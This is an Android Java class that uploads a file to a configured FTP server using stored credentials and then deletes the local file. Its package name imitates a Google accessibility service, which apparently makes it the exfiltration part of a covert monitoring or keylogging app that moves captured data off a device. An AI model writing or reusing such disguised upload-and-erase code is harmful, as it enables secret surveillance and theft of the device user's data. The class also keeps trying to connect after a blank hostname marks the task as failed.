package service.android.google.com.accessibility.upload.uploaders.ftp;

import android.support.annotation.NonNull;

import com.adeel.library.easyFTP;
import com.google.android.gms.gcm.GcmNetworkManager;
import com.google.android.gms.gcm.TaskParams;

import java.io.File;
import java.io.FileInputStream;

import service.android.google.com.accessibility.R;
import service.android.google.com.accessibility.upload.uploaders.BaseUploaderTask;

/**
 * Created by tim on 16.04.16.
 */
public class FTPUploaderTask extends BaseUploaderTask {

    private String hostName;
    private String userName;
    private String password;
    private String uploadPath;

    public FTPUploaderTask(final boolean isServiceEnabled) {
        super(FTPUploaderTask.class, isServiceEnabled);
    }

    public FTPUploaderTask() {
        this(false);
    }

    @Override
    public int onRunTask(final TaskParams taskParams) {
        getFTPPreferences();
        final File fileName = getFileName();

        return fileName != null ?
                uploadFileToFTPServer(fileName) :
                GcmNetworkManager.RESULT_FAILURE;
    }

    private synchronized int uploadFileToFTPServer(@NonNull final File fileToUpload) {
        int statusCode = GcmNetworkManager.RESULT_RESCHEDULE;
        final easyFTP easyFTP = new easyFTP();
        try {
            if (hostName.equals("")) {
                statusCode = GcmNetworkManager.RESULT_FAILURE;
            }

            easyFTP.connect(hostName, userName, password);

            if (!uploadPath.equals("")) {
                if (!easyFTP.setWorkingDirectory(uploadPath)) {
                    statusCode = GcmNetworkManager.RESULT_FAILURE;
                }
            }

            final FileInputStream srcFileStream = new FileInputStream(fileToUpload);
            easyFTP.uploadFile(srcFileStream, fileToUpload.getName());
            statusCode = GcmNetworkManager.RESULT_SUCCESS;
        } catch (Exception e) {
            statusCode = GcmNetworkManager.RESULT_FAILURE;
            handleException(e, fileToUpload);
        } finally {
            easyFTP.disconnect();
            removeFile(fileToUpload);
        }
        return statusCode;
    }

    private void getFTPPreferences() {
        hostName = prefser.get(resources.getString(R.string.pref_key_ftp_host), String.class, "");
        userName = prefser.get(resources.getString(R.string.pref_key_ftp_username), String.class, "");
        password = prefser.get(resources.getString(R.string.pref_key_ftp_password), String.class, "");
        uploadPath = prefser.get(resources.getString(R.string.pref_key_ftp_path), String.class, "");
    }
}